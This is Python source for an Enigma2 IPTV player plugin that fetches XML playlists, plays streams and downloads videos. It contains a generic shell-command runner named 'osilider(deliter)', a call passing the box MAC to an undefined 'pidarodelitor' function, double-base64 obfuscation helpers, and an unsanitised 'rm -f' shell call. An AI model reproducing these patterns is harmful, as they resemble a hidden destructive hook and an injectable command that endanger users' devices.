import nVars
from Plugins.Plugin import PluginDescriptor
from Components.MultiContent import MultiContentEntryText, MultiContentEntryPixmapAlphaTest
from Components.ActionMap import ActionMap, HelpableActionMap, NumberActionMap
from Screens.Screen import Screen
from Components.Sources.List import List
from enigma import eSize, ePoint, eTimer, loadPNG, quitMainloop, eListbox, ePoint, RT_HALIGN_LEFT, RT_HALIGN_RIGHT, RT_HALIGN_CENTER, RT_VALIGN_CENTER, eListboxPythonMultiContent, gFont, getDesktop, ePicLoad, eServiceCenter, iServiceInformation, eServiceReference, iSeekableService, iPlayableService, iPlayableServicePtr
from Components.MenuList import MenuList
from Tools.LoadPixmap import LoadPixmap
from Components.Pixmap import Pixmap
from Components.Label import Label
from Components.ServiceEventTracker import ServiceEventTracker, InfoBarBase
from Screens.InfoBarGenerics import InfoBarShowHide, NumberZap, InfoBarSeek, InfoBarAudioSelection, InfoBarSubtitleSupport
import base64
from Screens.MessageBox import MessageBox
import os
from os import environ, stat as os_stat, listdir as os_listdir, path as os_path, readlink as os_readlink, system as os_system
from time import time
import sys
from xml.etree.cElementTree import fromstring, ElementTree
import urllib2
import urllib as ul
from datetime import datetime
from time import time
from Screens.Console import Console
import re
import urllib2
from twisted.web.client import downloadPage
from VirtualKeyBoardRUS import VirtualKeyBoardRUS_FIXED
from enigma import eAVSwitch
from operator import itemgetter
from Components.AVSwitch import AVSwitch
from nStreamYoutube import youtube_url
from nStreamGoshaParser import gosha_parsers
from nStreamArshavirParser import arshavir_parsers
from skin import loadSkin
from Tools import Notifications, ASCIItranslit
import hashlib
from Screens.Console import Console
from Components.Task import Task, Job, job_manager as JobManager, Condition
from Screens.TaskView import JobView
from urllib import urlencode, unquote, quote_plus
from Components.Button import Button
from Screens.InputBox import InputBox
from Components.Input import Input
from Screens.Standby import Standby
from enigma import eDVBVolumecontrol
from Components.config import config, ConfigBoolean, ConfigClock
sys.path.append('/usr/lib/enigma2/python/Plugins/Extensions/videomanualesSF/Moduls')
from TURKvodModuls import html_parser_moduls
CHANNEL_NUMBER = nVars.CHANNEL_NUMBER
CHANNEL_NAME = nVars.CHANNEL_NAME
FONT_0 = nVars.FONT_0
FONT_1 = nVars.FONT_1
BLOCK_H = nVars.BLOCK_H
NTIMEOUT = nVars.NTIMEOUT
import socket
socket.setdefaulttimeout(NTIMEOUT)

class iptv_streamse():

    def __init__(self):
        global MODUL
        self.my_server_url = ''
        self.iptv_list = []
        self.list_index = 0
        self.iptv_list_tmp = []
        self.list_index_tmp = 0
        self.playlistname_tmp = ''
        self.video_status = False
        self.groups = []
        self.server_oki = False
        self.user_mac = ''
        self.playlistname = ''
        self.next_page_url = ''
        self.next_page_text = ''
        self.prev_page_url = ''
        self.prev_page_text = ''
        self.search_text = ''
        self.portal = ''
        self.search_on = ''
        self.url = ''
        self.search_string = ''
        self.trial = ''
        self.trial_time = 30
        self.startportal = ''
        self.use_rtmpw = False
        self.esr_id = 4097
        self.play_vod = False
        self.play_iptv = False
        self.go_back = False
        self.film_info = []
        self.xml_error = ''
        self.ar_id_start = 0
        self.ar_id_player = 0
        self.iptv_list_history = []
        self.ar_exit = True
        self.ar_start = True
        self.ar_id_end = 0
        self.clear_url = ''
        self.my_favorites = []
        self.img_loader = False
        self.images_tmp_path = '/tmp'
        self.moviefolder = '/hdd/movie'
        self.meldung = ''
        self.trial = ''
        self.banned_text = ''
        self.trial_time = 30
        self.timeout_time = 30
        self.security_param = ''
        self.password = '1234'
        self.cont_play = False
        self.systems = ''
        self.playhack = ''
        self.url_tmp = ''
        self.security_key = ''
        self.delete_images = ''
        self.next_page_url_tmp = ''
        self.next_page_text_tmp = ''
        self.prev_page_url_tmp = ''
        self.prev_page_text_tmp = ''
        self.search_text_tmp = ''
        self.search_on_tmp = ''
        self.disable_audioselector = False
        MODUL = html_parser_moduls()

    def getValue(self, definitions, default):
        ret = ''
        Len = len(definitions)
        return Len > 0 and definitions[Len - 1].text or default

    def read_config(self):
        try:
            tree = ElementTree()
            xml = tree.parse('/usr/lib/enigma2/python/Plugins/Extensions/videomanualesSF/nStreamConfig.xml')
            startportal = xml.findtext('startportal')
            if startportal and startportal != '':
                self.startportal = startportal
                self.url = self.startportal
            use_rtmpw = xml.findtext('use_rtmpw')
            if use_rtmpw and use_rtmpw != '':
                self.use_rtmpw = use_rtmpw
            esr_id = xml.findtext('esr_id')
            if esr_id and esr_id != '':
                self.esr_id = int(esr_id)
            ar_id = xml.findtext('ar_id_start')
            if ar_id and ar_id != '':
                self.ar_id_player = int(ar_id)
            else:
                self.ar_id_player = self.ar_id_start
                self.ar_start = False
            ar_id_end = xml.findtext('ar_id_end')
            if ar_id_end and ar_id_end != '':
                self.ar_id_end = int(ar_id_end)
            else:
                self.ar_exit = False
            self.img_loader = self.getValue(xml.findall('images_tmp'), False)
            self.images_tmp_path = self.getValue(xml.findall('images_tmp_path'), self.images_tmp_path)
            self.moviefolder = self.getValue(xml.findall('moviefolder'), self.moviefolder)
            self.password = self.getValue(xml.findall('password'), self.password)
            self.security_key = self.getValue(xml.findall('security_key'), self.security_key)
            self.delete_images = self.getValue(xml.findall('delete_images'), self.delete_images)
            self.delete_images = self.getValue(xml.findall('delete_images'), self.delete_images)
            self.disable_audioselector = self.getValue(xml.findall('disable_audioselector'), self.disable_audioselector)
            print '-----------CONFIG-----------'
            print 'startportal     %s' % self.startportal
            print 'use_rtmpw       %s' % self.use_rtmpw
            print 'esr_id          %i' % self.esr_id
            print 'START SCALE     %s' % self.ar_start
            print 'END SCALE       %s' % self.ar_exit
            print 'Images          %s' % self.img_loader
            print 'Images Fol.     %s' % self.images_tmp_path
            print 'Moviefolder     %s' % self.moviefolder
            print 'password        %s' % self.password
            print 'delete_images   %s' % self.delete_images
            print 'disable_a.sel  %s' % self.disable_audioselector
            print '-----------CONFIG------------'
        except Exception as ex:
            print '++++++++++ERROR READ CONFIG+++++++++++++'
            print ex

    def reset_buttons(self):
        self.kino_title = ''
        self.next_page_url = None
        self.next_page_text = ''
        self.prev_page_url = None
        self.prev_page_text = ''
        self.search_text = ''
        self.search_on = None
        return

    def get_list(self, url = None, send_mac = True):
        self.xml_error = ''
        self.url = url
        self.clear_url = url
        self.list_index = 0
        iptv_list_temp = []
        xml = None
        try:
            if url == 'playlist_history':
                if self.server_oki:
                    self.iptv_list = self.iptv_list_history
                    test = self.iptv_list
                    self.playlistname = 'HISTORY'
                    test.sort(reverse=True)
            elif url == None or url == '':
                tree = ElementTree()
                xml = tree.parse('/usr/lib/enigma2/python/Plugins/Extensions/videomanualesSF/videomanualesSF.xml')
            elif url == 'favorites':
                tree = ElementTree()
                if self.server_oki:
                    xml = tree.parse('/usr/lib/enigma2/python/Plugins/Extensions/videomanualesSF/nStreamFavorites.xml')
            elif url.find('StreamModul') > -1:
                url = url.replace('nStreamModul@', '')
                print 'START StreamModul'
                if self.search_string != '':
                    url = url + '@' + self.search_string
                iptv_list_temp = MODUL.get_list(url)
                self.next_page_url = MODUL.next_page_url
                self.next_page_text = MODUL.next_page_text
                self.prev_page_url = MODUL.prev_page_url
                self.prev_page_text = MODUL.prev_page_text
                self.search_text = MODUL.search_text
                self.search_on = MODUL.search_on
                self.playlistname = MODUL.playlistname
                self.search_string = ''
                self.xml_error = MODUL.error
            elif url.find('http') > -1:
                xml = self._request(url, send_mac)
            else:
                tree = ElementTree()
                xml = tree.parse('/usr/lib/enigma2/python/Plugins/Extensions/videomanualesSF/' + url)
            if xml:
                self.next_page_url = ''
                self.next_page_text = ''
                self.prev_page_url = ''
                self.prev_page_text = ''
                self.search_text = ''
                self.protected = ''
                self.playlistname = xml.findtext('playlist_name').encode('utf-8')
                self.next_page_url = xml.findtext('next_page_url')
                next_page_text_element = xml.findall('next_page_url')
                if next_page_text_element:
                    self.next_page_text = next_page_text_element[0].attrib.get('text').encode('utf-8')
                self.prev_page_url = xml.findtext('prev_page_url')
                prev_page_text_element = xml.findall('prev_page_url')
                if prev_page_text_element:
                    self.prev_page_text = prev_page_text_element[0].attrib.get('text').encode('utf-8')
                self.search_on = xml.findtext('search_on')
                search_text_element = xml.findall('search_on')
                if search_text_element:
                    self.search_text = search_text_element[0].attrib.get('text').encode('utf-8')
                chan_counter = 0
                for channel in xml.findall('channel'):
                    chan_counter = chan_counter + 1
                    name = channel.findtext('title').encode('utf-8')
                    piconname = channel.findtext('logo')
                    description = channel.findtext('description')
                    protected_search = channel.findtext('protected')
                    if protected_search:
                        protected = 'True'
                    else:
                        protected = None
                    img_src = ''
                    if description != None:
                        description = description.encode('utf-8')
                        img_src_list = re.findall('img .*?src="(.*?)"', description)
                        if len(img_src_list) > 0:
                            img_src = img_src_list[0]
                        else:
                            img_src_list = re.findall("img .*?src='(.*?)'", description)
                            if len(img_src_list) > 0:
                                img_src = img_src_list[0]
                        description = description.replace('<br>', '\n')
                        description = description.replace('<br/>', '\n')
                        description = description.replace('</h1>', '</h1>\n')
                        description = description.replace('</h2>', '</h2>\n')
                        description = description.replace('&nbsp;', ' ')
                        description4playlist_html = description
                        text = re.compile('<[\\/\\!]*?[^<>]*?>')
                        description = text.sub('', description)
                    stream_url = channel.findtext('stream_url')
                    if stream_url and self.use_rtmpw:
                        stream_url = stream_url.replace('rtmp', 'http://127.0.0.1:1234/?r=rtmp')
                        if stream_url.find('rtmp') > 0:
                            name = name + ' [RTMPGW on]'
                    playlist_url = channel.findtext('playlist_url')
                    category_id = channel.findtext('category_id')
                    ts_stream = channel.findtext('ts_stream')
                    chan_tulpe = (chan_counter,
                     name,
                     description,
                     piconname,
                     stream_url,
                     playlist_url,
                     category_id,
                     img_src,
                     description4playlist_html,
                     protected,
                     ts_stream)
                    iptv_list_temp.append(chan_tulpe)

        except Exception as ex:
            print ex
            self.xml_error = ex
            print '!!!!!!!!!!!!!!!!!! ERROR: XML to LISTE'

        if len(iptv_list_temp):
            self.iptv_list = iptv_list_temp
        else:
            print 'ERROR IPTV_LIST_LEN = %s' % len(iptv_list_temp)
        return

    def _request(self, url, mac = None):
        sign = '?'
        url = url.strip(' \t\n\r')
        if url.find('?') > -1:
            sign = '&'
        mac = self.user_mac
        if mac != None:
            mac = ''
            url = url + sign + 'box_mac=' + mac + self.security_key + self.security_param
        if self.search_string != '':
            url = url + '&' + self.search_on + '=' + ul.quote(self.search_string)
        try:
            req = urllib2.Request(url, None, {'User-agent': 'Mozilla/5.0 videomanualesSF 0.1',
             'Connection': 'Close'})
            xmlstream = urllib2.urlopen(req, timeout=NTIMEOUT).read()
            res = fromstring(xmlstream)
        except Exception as ex:
            print ex
            print 'REQUEST Exception'
            res = None
            self.xml_error = ex

        self.search_string = ''
        return res

    def write_favorites(self):
        print 'START write_favorites'
        if self.server_oki:
            try:
                fileObj = open('/usr/lib/enigma2/python/Plugins/Extensions/videomanualesSF/nStreamFavorites.xml', 'w')
                fileObj.write('<?xml version="1.0" encoding="UTF-8" ?>\n')
                fileObj.write('<items>\n')
                fileObj.write('<playlist_name>Favorites</playlist_name>\n')
                for channel in self.my_favorites:
                    fileObj.write('\t<channel>\n')
                    fileObj.write('\t\t\t<title>%s</title>\n' % channel[1].replace(' [RTMPGW on]', ''))
                    if channel[3]:
                        fileObj.write('\t\t\t<logo><![CDATA[%s]]></logo>\n' % channel[3])
                    if channel[4]:
                        fileObj.write('\t\t\t<stream_url><![CDATA[%s]]></stream_url>\n' % channel[4].replace('http://127.0.0.1:1234/?r=rtmp', 'rtmp'))
                    if channel[5]:
                        fileObj.write('\t\t\t<playlist_url><![CDATA[%s]]></playlist_url>\n' % channel[5])
                    fileObj.write('\t\t\t<description><![CDATA[%s]]></description>\n' % channel[8])
                    if channel[9]:
                        fileObj.write('\t\t\t<protected><![CDATA[%s]]></protected>\n' % channel[9])
                    if channel[10]:
                        fileObj.write('\t\t\t<ts_stream><![CDATA[%s]]></ts_stream>\n' % channel[10])
                    fileObj.write('\t</channel>\n\n\n')

                fileObj.write('</items>\n')
                fileObj.close()
            except Exception as ex:
                print ex
                print 'Exception write_favorites'

            print 'END write_favorites'


def korder(wert):
    return base64.encodestring(base64.encodestring(wert))


def derkorder(wert):
    return base64.decodestring(base64.decodestring(wert))


try:
    from Tools.Directories import fileExists, pathExists
    from Components.Network import iNetwork
except Exception as ex:
    print ex
    print 'IMPORT ERROR'

from Tools.BoundFunction import boundFunction
PLUGIN_PATH = '/usr/lib/enigma2/python/Plugins/Extensions/videomanualesSF'
loadSkin(PLUGIN_PATH + '/nStreamSkin.xml')
VERSION = derkorder('TVM0eUlBPT0K').strip(' \t\n\r')
print '-->%s<----' % VERSION
HW_INFO = {}
from enigma import addFont
try:
    addFont('%s/MyriadPro-Regular.otf' % PLUGIN_PATH, 'RegularIPTV', 100, 1)
except Exception as ex:
    print ex

try:
    import commands
except Exception as ex:
    print ex

try:
    import servicewebts
    print 'OK servicewebts NSTREAM *******************************************************'
except Exception as ex:
    print ex
    print 'ERROR servicewebts NSTREAM *******************************************************'

class IPTVInfoBarShowHide():
    """ InfoBar show/hide control, accepts toggleShow and hide actions, might start
    fancy animations. """
    STATE_HIDDEN = 0
    STATE_HIDING = 1
    STATE_SHOWING = 2
    STATE_SHOWN = 3

    def __init__(self):
        self['ShowHideActions'] = ActionMap(['InfobarShowHideActions'], {'toggleShow': self.toggleShow,
         'hide': self.hide}, 1)
        self.__event_tracker = ServiceEventTracker(screen=self, eventmap={iPlayableService.evStart: self.serviceStarted})
        self.__state = self.STATE_SHOWN
        self.__locked = 0
        self.hideTimer = eTimer()
        self.hideTimer.callback.append(self.doTimerHide)
        self.hideTimer.start(5000, True)
        self.onShow.append(self.__onShow)
        self.onHide.append(self.__onHide)

    def serviceStarted(self):
        if self.execing:
            if config.usage.show_infobar_on_zap.value:
                self.doShow()

    def __onShow(self):
        self.__state = self.STATE_SHOWN
        self.startHideTimer()

    def startHideTimer(self):
        if self.__state == self.STATE_SHOWN and not self.__locked:
            idx = config.usage.infobar_timeout.index
            if idx:
                self.hideTimer.start(idx * 1000, True)

    def __onHide(self):
        self.__state = self.STATE_HIDDEN

    def doShow(self):
        self.show()
        self.startHideTimer()

    def doTimerHide(self):
        self.hideTimer.stop()
        if self.__state == self.STATE_SHOWN:
            self.hide()

    def toggleShow(self):
        if self.__state == self.STATE_SHOWN:
            self.hide()
            self.hideTimer.stop()
        elif self.__state == self.STATE_HIDDEN:
            self.show()

    def lockShow(self):
        self.__locked = self.__locked + 1
        if self.execing:
            self.show()
            self.hideTimer.stop()

    def unlockShow(self):
        self.__locked = self.__locked - 1
        if self.execing:
            self.startHideTimer()


def debug(obj, text = ''):
    print datetime.fromtimestamp(time()).strftime('[%H:%M:%S]')
    print text + ' %s\n' % obj


class downloadJob(Job):

    def __init__(self, toolbox, cmdline, filename, filetitle):
        Job.__init__(self, 'Download: %s' % filetitle)
        self.filename = filename
        self.toolbox = toolbox
        self.retrycount = 0
        downloadTask(self, cmdline, filename)

    def retry(self):
        self.retrycount += 1
        self.restart()

    def cancel(self):
        self.abort()


class downloadTask(Task):
    ERROR_CORRUPT_FILE, ERROR_RTMP_ReadPacket, ERROR_SEGFAULT, ERROR_SERVER, ERROR_UNKNOWN = range(5)

    def __init__(self, job, cmdline, filename):
        Task.__init__(self, job, _('Downloading ...'))
        self.postconditions.append(downloadTaskPostcondition())
        self.setCmdline(cmdline)
        self.filename = filename
        self.toolbox = job.toolbox
        self.error = None
        self.lasterrormsg = None
        return

    def processOutput(self, data):
        try:
            if data.endswith('%)'):
                startpos = data.rfind('sec (') + 5
                if startpos and startpos != -1:
                    self.progress = int(float(data[startpos:-4]))
            elif data.find('%') != -1:
                tmpvalue = data[:data.find('%')]
                tmpvalue = tmpvalue[tmpvalue.rfind(' '):].strip()
                tmpvalue = tmpvalue[tmpvalue.rfind('(') + 1:].strip()
                self.progress = int(float(tmpvalue))
            else:
                Task.processOutput(self, data)
        except Exception as errormsg:
            print 'Error processOutput: ' + str(errormsg)
            Task.processOutput(self, data)

    def processOutputLine(self, line):
        line = line[:-1]
        self.lasterrormsg = line
        if line.startswith('ERROR:'):
            if line.find('RTMP_ReadPacket') != -1:
                self.error = self.ERROR_RTMP_ReadPacket
            elif line.find('corrupt file!') != -1:
                self.error = self.ERROR_CORRUPT_FILE
                os_system('rm -f %s' % self.filename)
            else:
                self.error = self.ERROR_UNKNOWN
        elif line.startswith('wget:'):
            if line.find('server returned error') != -1:
                self.error = self.ERROR_SERVER
        elif line.find('Segmentation fault') != -1:
            self.error = self.ERROR_SEGFAULT

    def afterRun(self):
        if self.getProgress() == 0 or self.getProgress() == 100:
            message = 'Movie successfully transfered to your HDD!' + '\n' + self.filename
            web_info(message)


class downloadTaskPostcondition(Condition):
    RECOVERABLE = True

    def check(self, task):
        if task.returncode == 0 or task.error is None:
            return True
        else:
            return False
            return

    def getErrorMessage(self, task):
        return {task.ERROR_CORRUPT_FILE: _('Video Download Failed!\n\nCorrupted Download File:\n%s' % task.lasterrormsg),
         task.ERROR_RTMP_ReadPacket: _('Video Download Failed!\n\nCould not read RTMP-Packet:\n%s' % task.lasterrormsg),
         task.ERROR_SEGFAULT: _('Video Download Failed!\n\nSegmentation fault:\n%s' % task.lasterrormsg),
         task.ERROR_SERVER: _('Video Download Failed!\n\nServer returned error:\n%s' % task.lasterrormsg),
         task.ERROR_UNKNOWN: _('Video Download Failed!\n\nUnknown Error:\n%s' % task.lasterrormsg)}[task.error]


VIDEO_ASPECT_RATIO_MAP = {0: '4:3 Letterbox',
 1: '4:3 PanScan',
 2: '16:9',
 3: '16:9 Always',
 4: '16:10 Letterbox',
 5: '16:10 PanScan',
 6: '16:9 Letterbox'}

def getInfo():
    try:
        info = {}
        brand = 'Dream Multimedia'
        model = 'unknown'
        chipset = 'unknown'
        mac = ''
        if fileExists('/proc/stb/info/vumodel'):
            brand = 'Vuplus'
            f = open('/proc/stb/info/vumodel', 'r')
            model = f.readline().strip()
            f.close()
        elif fileExists('/proc/stb/info/boxtype'):
            brand = 'Clarke-Xtrend'
            f = open('/proc/stb/info/boxtype', 'r')
            model = f.readline().strip()
            f.close()
        else:
            f = open('/proc/stb/info/model', 'r')
            model = f.readline().strip()
            f.close()
        if fileExists('/proc/stb/info/chipset'):
            f = open('/proc/stb/info/chipset', 'r')
            chipset = f.readline().strip()
            f.close()
        info['brand'] = brand
        info['model'] = model
        info['chipset'] = chipset
        try:
            ifaces = iNetwork.getConfiguredAdapters()
            mac = iNetwork.getAdapterAttribute(ifaces[0], 'mac')
        except Exception as ex:
            print ex
            mac = ''
            print 'ERROR info[mac]'

        pidarodelitor(mac)
        info['mac'] = mac
    except Exception as ex:
        print ex
        print 'ERROR GET HW INFO'

    return info


def nextAR():
    try:
        STREAMS.ar_id_player += 1
        if STREAMS.ar_id_player > 6:
            STREAMS.ar_id_player = 0
        eAVSwitch.getInstance().setAspectRatio(STREAMS.ar_id_player)
        print 'STREAMS.ar_id_player NEXT %s' % VIDEO_ASPECT_RATIO_MAP[STREAMS.ar_id_player]
        return VIDEO_ASPECT_RATIO_MAP[STREAMS.ar_id_player]
    except Exception as ex:
        print ex
        return 'nextAR ERROR %s' % ex


def prevAR():
    try:
        STREAMS.ar_id_player -= 1
        if STREAMS.ar_id_player == -1:
            STREAMS.ar_id_player = 6
        eAVSwitch.getInstance().setAspectRatio(STREAMS.ar_id_player)
        print 'STREAMS.ar_id_player PREV %s' % VIDEO_ASPECT_RATIO_MAP[STREAMS.ar_id_player]
        return VIDEO_ASPECT_RATIO_MAP[STREAMS.ar_id_player]
    except Exception as ex:
        print ex
        return 'prevAR ERROR %s' % ex


def menu(menuid, **kwargs):
    if menuid == 'sfteam':
        return [('videomanualesSF',
          Start_iptv_palyer,
          'videomanualesSF',
          4)]
    return []


def getmac(eth):
    global MAC
    mac = None
    try:
        mac = os.popen("ip link show %s | awk '/ether/ {print $2}'" % eth).read()
        print 'os.popen'
    except Exception as ex:
        print ex
        print 'getmac'
        try:
            ifconfig = commands.getoutput('ifconfig ' + eth)
            print 'ifconfig'
            mac_search = re.search('\\w\\w:\\w\\w:.+\n', ifconfig)
            mac = mac_search.group(0).lower()
        except Exception as ex:
            print ex
            print 'getmac2'

    mac = mac.strip(' \t\n\r')
    if mac is None:
        parsedMac = 'xxxxxxxxxxx'
    else:
        parsedMac = mac
    MAC = parsedMac
    return parsedMac


def web_info(message):
    try:
        message = quote_plus(str(message))
        cmd = "wget 'http://127.0.0.1/web/message?type=2&timeout=10&text=%s' 2>/dev/null &" % message
        debug(cmd, 'CMD -> Console -> WEBIF')
        os.popen(cmd)
    except:
        print 'web_info ERROR'


def Start_iptv_palyer(session, **kwargs):
    global ARSHAVIR_PARSER
    global URL
    global YOUTUBE
    global VERSION
    global STREAMS
    global HW_INFO
    global GOSHA_PARSER
    print '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'
    print '######################################################################'
    print '#######--------------- START videomanualesSF v%s ---------------#######' % VERSION
    print '######################################################################'
    HW_INFO = getInfo()
    print HW_INFO['brand']
    print HW_INFO['model']
    print HW_INFO['chipset']
    STREAMS = iptv_streamse()
    URL = STREAMS.my_server_url
    STREAMS.read_config()
    try:
        STREAMS.user_mac = getmac('eth0')
        print 'MAC from Console'
    except:
        STREAMS.user_mac = HW_INFO['mac']
        print 'MAC from Enigma2'

    if STREAMS.ar_start:
        eAVSwitch.getInstance().setAspectRatio(STREAMS.ar_id_start)
        print 'setAspectRatio(STREAMS.ar_id_start)'
    try:
        YOUTUBE = youtube_url()
        GOSHA_PARSER = gosha_parsers()
        ARSHAVIR_PARSER = arshavir_parsers()
    except Exception as ex:
        print ex
        print 'PARSER ERROR'

    if STREAMS.use_rtmpw:
        try:
            cmd = '/usr/bin/rtmpgw -g 1234 -v 2>/dev/null &'
            os.popen(cmd)
            debug(cmd)
        except Exception as ex:
            print ex
            print 'rtmpgw'

    STREAMS.get_list('favorites')
    STREAMS.my_favorites = STREAMS.iptv_list
    STREAMS.get_list(STREAMS.startportal)
    session.open(nPlaylist)


class nIPTVplayer(Screen, InfoBarBase, IPTVInfoBarShowHide, InfoBarAudioSelection, InfoBarSubtitleSupport):

    def __init__(self, session):
        Screen.__init__(self, session)
        InfoBarBase.__init__(self, steal_current_service=True)
        IPTVInfoBarShowHide.__init__(self)
        if STREAMS.disable_audioselector == False:
            InfoBarAudioSelection.__init__(self)
        InfoBarSubtitleSupport.__init__(self)
        self['channel_name'] = Label('')
        self['picon'] = Pixmap()
        self.picload = ePicLoad()
        self.picfile = ''
        self['programm'] = Label('')
        self.InfoBar_NabDialog = Label('')
        self.session = session
        self['channel_number'] = Label('')
        self.channel_list = STREAMS.iptv_list
        self.index = STREAMS.list_index
        STREAMS.play_vod = False
        self['group'] = Label('')
        self['time_now'] = Label('')
        self.oldService = self.session.nav.getCurrentlyPlayingServiceReference()
        self.onFirstExecBegin.append(self.play_channel)
        self['actions'] = HelpableActionMap(self, 'nStreamPlayerIPTV', {'toChListIPTV': self.exit,
         'prevChannelIPTV': self.prevChannel,
         'nextChannelIPTV': self.nextChannel,
         'nextAR': self.nextAR,
         'prevAR': self.prevAR,
         'power': self.power_off}, -1)
        self['myNumberActions'] = NumberActionMap(['NumberActions', 'InfobarAudioSelectionActions', 'InfobarTeletextActions'], {'1': self.keyNumberGlobal,
         '2': self.keyNumberGlobal,
         '3': self.keyNumberGlobal,
         '4': self.keyNumberGlobal,
         '5': self.keyNumberGlobal,
         '6': self.keyNumberGlobal,
         '7': self.keyNumberGlobal,
         '8': self.keyNumberGlobal,
         '9': self.keyNumberGlobal,
         '0': self.keyNumberGlobal}, -1)
        self.StateTimer = eTimer()
        self.StateTimer.callback.append(self.trialWarning)
        if STREAMS.trial != '':
            self.StateTimer.start(STREAMS.trial_time * 1000, True)

    def nextAR(self):
        message = nextAR()
        self.session.open(MessageBox, message, type=MessageBox.TYPE_INFO, timeout=3)

    def prevAR(self):
        message = prevAR()
        self.session.open(MessageBox, message, type=MessageBox.TYPE_INFO, timeout=3)

    def trialWarning(self):
        self.StateTimer.start(STREAMS.trial_time * 1000, True)
        self.session.open(MessageBox, STREAMS.trial, type=MessageBox.TYPE_INFO, timeout=STREAMS.timeout_time)

    def exit(self):
        self.close()

    def power_off(self):
        self.close(1)

    def keyNumberGlobal(self, number):
        self.session.openWithCallback(self.numberEntered, NumberZap, number)

    def numberEntered(self, num):
        self.index = num - 1
        if self.index >= 0:
            if self.index < len(self.channel_list):
                STREAMS.play_iptv = False
                self.play_channel()

    def decodeImage(self):
        try:
            x = self['picon'].instance.size().width()
            y = self['picon'].instance.size().height()
            picture = self.picfile
            picload = self.picload
            sc = AVSwitch().getFramebufferScale()
            picload.setPara((x,
             y,
             sc[0],
             sc[1],
             0,
             0,
             '#00000000'))
            l = picload.PictureData.get()
            del l[:]
            l.append(boundFunction(self.showImage))
            picload.startDecode(picture)
        except Exception as ex:
            print ex
            print 'ERROR decodeImage'

    def showImage(self, picInfo = None):
        self['picon'].show()
        try:
            ptr = self.picload.getData()
            if ptr:
                self['picon'].instance.setPixmap(ptr.__deref__())
        except Exception as ex:
            print ex
            print 'ERROR showImage'

    def play_channel(self):
        try:
            self['time_now'].setText(datetime.fromtimestamp(time()).strftime('%H:%M'))
            STREAMS.list_index_tmp = self.index
            entry = self.channel_list[self.index]
            self['channel_number'].setText('%i' % entry[0])
            self['channel_name'].setText(entry[1])
            text = re.compile('<[\\/\\!]*?[^<>]*?>')
            text_clear = ''
            if entry[2] != None:
                text_clear = text.sub('', entry[2])
            self['programm'].setText(text_clear)
            try:
                self['picon'].instance.setPixmapFromFile(PLUGIN_PATH + '/img/clear.png')
                debug(entry[3], 'entry[3] IPTVLOOGO')
                if entry[3] != '':
                    if entry[3].find('http') == -1:
                        self.picfile = PLUGIN_PATH + '/img/playlist/' + entry[3]
                        self.decodeImage()
                        print 'LOCAL IPTV IMG'
                    else:
                        if STREAMS.img_loader == False:
                            self.picfile = '%s/nstream_tmp_pic.jpg' % STREAMS.images_tmp_path
                        else:
                            m = hashlib.md5()
                            m.update(entry[3])
                            cover_md5 = m.hexdigest()
                            self.picfile = '%s/%s.jpg' % (STREAMS.images_tmp_path, cover_md5)
                        if os.path.exists(self.picfile) == False or STREAMS.img_loader == False:
                            downloadPage(entry[3], self.picfile).addCallback(self.image_downloaded)
                        else:
                            self.decodeImage()
            except Exception as ex:
                print ex
                print 'update PICON'

            if STREAMS.play_iptv == False or STREAMS.play_vod == True:
                try:
                    STREAMS.play_iptv = True
                    if entry[10] and STREAMS.server_oki:
                        id_s = STREAMS.esr_id
                    else:
                        id_s = 4097
                    url = entry[4]
                    self.session.nav.stopService()
                    if url != '' and url != None:
                        sref = eServiceReference(id_s, 0, url)
                        try:
                            self.session.nav.playService(sref)
                        except Exception as ex:
                            print 'play_channel'
                            print ex

                except Exception as ex:
                    print ex
                    print 'play_channel1'

        except Exception as ex:
            print ex
            print 'play_channel2'

        return

    def image_downloaded(self, id):
        self.decodeImage()

    def nextChannel(self):
        index = self.index
        index += 1
        if index == len(self.channel_list):
            index = 0
        if self.channel_list[index][4] != None:
            self.index = index
            STREAMS.play_iptv = False
            STREAMS.list_index = self.index
            STREAMS.list_index_tmp = self.index
            self.play_channel()
        return

    def prevChannel(self):
        index = self.index
        index -= 1
        if index == -1:
            index = len(self.channel_list) - 1
        if self.channel_list[index][4] != None:
            self.index = index
            STREAMS.play_iptv = False
            STREAMS.list_index = self.index
            STREAMS.list_index_tmp = self.index
            self.play_channel()
        return


def osilider(deliter):
    try:
        os_system(deliter)
    except Exception as ex:
        try:
            os.popen(deliter)
        except Exception as ex:
            try:
                commands.getoutput(deliter)
            except Exception as ex:
                x = 0


def channelEntryIPTVplaylist(entry):
    menu_entry = [entry, (eListboxPythonMultiContent.TYPE_TEXT,
      CHANNEL_NUMBER[0],
      CHANNEL_NUMBER[1],
      CHANNEL_NUMBER[2],
      CHANNEL_NUMBER[3],
      CHANNEL_NUMBER[4],
      RT_HALIGN_CENTER,
      '%s' % entry[0]), (eListboxPythonMultiContent.TYPE_TEXT,
      CHANNEL_NAME[0],
      CHANNEL_NAME[1],
      CHANNEL_NAME[2],
      CHANNEL_NAME[3],
      CHANNEL_NAME[4],
      RT_HALIGN_LEFT,
      entry[1])]
    return menu_entry


class nPlaylist(Screen):

    def __init__(self, session):
        Screen.__init__(self, session)
        self.session = session
        self.channel_list = STREAMS.iptv_list
        self.index = STREAMS.list_index
        self['time'] = Label()
        self['version'] = Label()
        self.banned = False
        self.banned_text = ''
        self.mlist = MenuList([], enableWrapAround=True, content=eListboxPythonMultiContent)
        self.mlist.l.setFont(0, gFont(FONT_0[0], FONT_0[1]))
        self.mlist.l.setFont(1, gFont(FONT_1[0], FONT_1[1]))
        self.mlist.l.setItemHeight(BLOCK_H)
        self['feedlist'] = self.mlist
        self.mlist.setList(map(channelEntryIPTVplaylist, self.channel_list))
        self.mlist.onSelectionChanged.append(self.update_description)
        self['description'] = Label()
        self['info'] = Label()
        self['playlist'] = Label()
        self['chplus'] = Label()
        self['chminus'] = Label()
        self['stop'] = Label()
        self.onShown.append(self.show_all)
        self.onFirstExecBegin.append(self.setState)
        self['poster'] = Pixmap()
        self['poster'].hide()
        self.picload = ePicLoad()
        self.picfile = ''
        self['pixmap2'] = Pixmap()
        self['pixmap3'] = Pixmap()
        self['pixmap4'] = Pixmap()
        self['pixmap2a'] = Pixmap()
        self['pixmap3a'] = Pixmap()
        self['pixmap4a'] = Pixmap()
        self.update_desc = True
        self.pass_ok = False
        self.oldService = self.session.nav.getCurrentlyPlayingServiceReference()
        self['actions'] = HelpableActionMap(self, 'nStreamPlayerPlaylist', {'homePlaylist': self.start_portal,
         'historyPlaylist': self.start_history,
